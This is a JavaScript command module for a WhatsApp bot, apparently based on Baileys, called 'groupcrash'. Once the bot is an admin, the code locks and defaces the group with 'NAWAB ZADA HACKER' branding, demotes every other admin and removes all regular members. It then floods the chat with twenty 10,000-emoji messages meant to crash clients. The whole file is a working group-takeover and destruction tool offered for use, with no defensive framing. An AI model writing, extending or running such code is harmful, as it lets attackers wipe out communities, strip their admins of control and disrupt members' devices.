const config = require('../config');

module.exports = {
  name: 'groupcrash',
  aliases: ['gcrash', 'destroy', 'bangroup', 'gcban'],
  execute: async (sock, msg, args, from, sender, config) => {
    await sock.sendMessage(from, {
      text: `💀 *GROUP DESTROY SYSTEM* 💀\n\n` +
            `🔥 Initializing group destruction...`
    }, { quoted: msg });
    
    try {
      const groupMetadata = await sock.groupMetadata(from);
      const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
      const isBotAdmin = groupMetadata.participants.find(p => p.id === botId)?.admin;
      
      if (!isBotAdmin) {
        return await sock.sendMessage(from, {
          text: `❌ Bot needs admin access.\n\nMake bot admin first.`
        });
      }
      
      // PHASE 1: Change settings
      await sock.groupSettingUpdate(from, 'announcement');
      await sock.groupUpdateSubject(from, '💀 CRASHED BY NAWAB ZADA 🦅🙌');
      await sock.groupUpdateDescription(from, '💀 DESTROYED 💀\n\n🔥 NAWAB ZADA HACKER');
      
      // PHASE 2: Demote all admins
      const admins = groupMetadata.participants.filter(p => p.admin && p.id !== botId);
      for (const admin of admins) {
        try { await sock.groupParticipantsUpdate(from, [admin.id], 'demote'); } catch(e) {}
      }
      
      // PHASE 3: Remove all members
      const members = groupMetadata.participants.filter(p => !p.admin);
      let removed = 0;
      for (const member of members) {
        try {
          await sock.groupParticipantsUpdate(from, [member.id], 'remove');
          removed++;
        } catch(e) {}
      }
      
      // PHASE 4: Crash messages
      for (let i = 0; i < 20; i++) {
        try {
          await sock.sendMessage(from, { 
            text: '💀'.repeat(10000) + '\n🔥 NAWAB ZADA HACKER 🦅🙌'
          });
        } catch(e) {}
      }
      
      await sock.sendMessage(from, {
        text: `✅ *GROUP DESTROYED* 💀\n\n` +
              `▸ Admins demoted: ${admins.length}\n` +
              `▸ Members removed: ${removed}\n` +
              `▸ Group renamed & locked\n\n` +
              `🔥 ${config.ownerName}`
      });
      
    } catch(err) {
      await sock.sendMessage(from, { text: `❌ Error: ${err.message}` });
    }
  }
};
